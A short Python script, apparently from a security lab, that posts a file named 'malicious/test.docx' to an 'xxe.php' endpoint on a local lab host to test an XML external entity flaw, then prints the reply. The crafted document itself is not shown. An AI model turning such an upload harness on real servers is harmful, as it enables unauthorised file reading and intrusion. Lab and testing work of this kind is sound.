import requests

s = requests.session()

res = s.post('http://xxe.local.lab.io/xxe.php', files={'file': open('malicious/test.docx','rb')})

print(res.text )

